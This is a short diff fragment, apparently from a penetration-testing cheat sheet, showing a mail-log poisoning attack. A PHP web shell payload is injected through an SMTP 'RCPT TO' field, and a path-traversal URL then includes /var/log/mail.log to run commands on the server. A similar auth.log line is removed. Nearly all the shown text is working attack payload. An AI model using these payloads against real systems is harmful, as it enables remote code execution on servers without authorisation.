@@ -98,6 +98,5 @@ RCPT TO:<?php system($_GET['c']); ?>
 
 Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log&c=id
 
-Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&cmd=id
 
 ```
